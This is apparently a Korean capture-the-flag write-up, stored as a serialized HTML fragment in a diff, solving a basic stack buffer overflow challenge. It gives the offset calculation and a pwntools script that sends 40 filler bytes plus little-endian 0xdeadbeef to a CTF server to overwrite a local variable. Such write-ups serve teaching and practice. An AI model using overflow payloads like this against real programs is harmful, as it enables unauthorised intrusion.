@@ -1,0 +1,24 @@
+I"�<p>IDA를 먼저 보자.</p>
+
+<p><img width="384" alt="캡처" src="https://user-images.githubusercontent.com/51374792/62383735-72a4df00-b58b-11e9-905b-a154cd36f94a.PNG" /></p>
+
+<p>s만 입력받아 v5까지 영향을 주어야 하는 코드다.</p>
+
+<p>v5가 deadbeef가 되도록 해 주면 되겠다.</p>
+
+<p>0x34-0xC=40</p>
+
+<p>페이로드는 40개의 값과 리틀 엔디안 deadbeef 정도면 되겠다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"ctf.j0n9hyun.xyz"</span><span class="p">,</span><span class="mi">3000</span><span class="p">)</span>
+<span class="n">code</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">40</span><span class="o">+</span><span class="s">"</span><span class="se">\xef\xbe\xad\xde</span><span class="s">"</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+:ET
